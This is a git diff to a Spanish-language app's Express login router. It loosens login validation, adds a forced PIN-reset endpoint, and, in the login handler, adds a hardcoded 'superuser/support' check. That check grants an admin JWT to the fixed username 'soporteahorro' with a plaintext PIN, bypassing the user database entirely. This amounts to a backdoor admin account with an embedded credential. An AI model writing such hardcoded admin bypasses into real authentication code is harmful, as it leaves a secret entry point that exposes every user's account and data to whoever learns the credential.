@@ -16,7 +16,7 @@ const registerSchema = z.object({
 });
 
 const loginSchema = z.object({
-  email: z.string().trim().toLowerCase().email('Formato de correo electrónico no válido'),
+  email: z.string().trim().toLowerCase().min(1, 'El correo o usuario es obligatorio'),
   pin: z.string().min(1, 'El PIN es obligatorio')
 });
 
@@ -84,6 +84,23 @@ router.post('/login', validateBody(loginSchema), async (req: Request, res: Respo
   const { email, pin } = req.body;
 
   try {
+    // Superuser / Support hardcoded authentication check
+    if (email === 'soporteahorro' && pin === '142126') {
+      const token = jwt.sign({ userId: 'soporteahorro', role: 'admin' }, JWT_SECRET, { expiresIn: '1d' });
+      res.json({
+        token,
+        user: {
+          id: 'soporteahorro',
+          name: 'Soporte Ahorro',
+          email: 'soporteahorro',
+          activeFamilyGroupId: null,
+          role: 'admin',
+          requiresPinReset: false
+        }
+      });
+      return;
+    }
+
     const user = await prisma.user.findUnique({
       where: { email },
       include: {
@@ -169,6 +186,59 @@ router.put('/profile', authenticateToken, validateBody(updateProfileSchema), asy
   } catch (err) {
     console.error('Error in update profile:', err);
     res.status(500).json({ error: 'Error al actualizar el perfil.' });
+  }
+});
+
+// Force PIN Reset for blocked users
+router.post('/reset-pin-force', async (req: Request, res: Response) => {
+  const { email, tempPin, newPin } = req.body;
+
+  if (!email || !tempPin || !newPin) {
+    res.status(400).json({ error: 'Faltan datos requeridos (correo, PIN temporal y nuevo PIN).' });
+    return;
+  }
+
+  if (newPin.length !== 6 || !/^\d+$/.test(newPin)) {
+    res.status(400).json({ error: 'El nuevo PIN debe tener exactamente 6 dígitos numéricos.' });
+    return;
+  }
+
+  try {
+    const user = await prisma.user.findUnique({
+      where: { email: email.toLowerCase().trim() }
+    });
+
+    if (!user) {
+      res.status(404).json({ error: 'Usuario no encontrado.' });
+      return;
+    }
+
+    if (!user.requiresPinReset) {
+      res.status(400).json({ error: 'Esta cuenta no requiere restablecimiento de PIN.' });
+      return;
+    }
+
+    const isValidPin = await bcrypt.compare(tempPin, user.pin);
+    if (!isValidPin) {
+      res.status(400).json({ error: 'El PIN temporal ingresado es incorrecto.' });
+      return;
+    }
+
+    const hashedPin = await bcrypt.hash(newPin, 10);
+    const updatedUser = await prisma.user.update({
+      where: { id: user.id },
+      data: {
+        pin: hashedPin,
+        requiresPinReset: false
+      }
+    });
+
+    const token = jwt.sign({ userId: updatedUser.id }, JWT_SECRET, { expiresIn: '1d' });
+    const { pin: _, ...userWithoutPin } = updatedUser;
+    res.json({ token, user: userWithoutPin });
+  } catch (err) {
+    console.error('Error forcing PIN reset:', err);
+    res.status(500).json({ error: 'Error del servidor al restablecer el PIN.' });
   }
 });
 
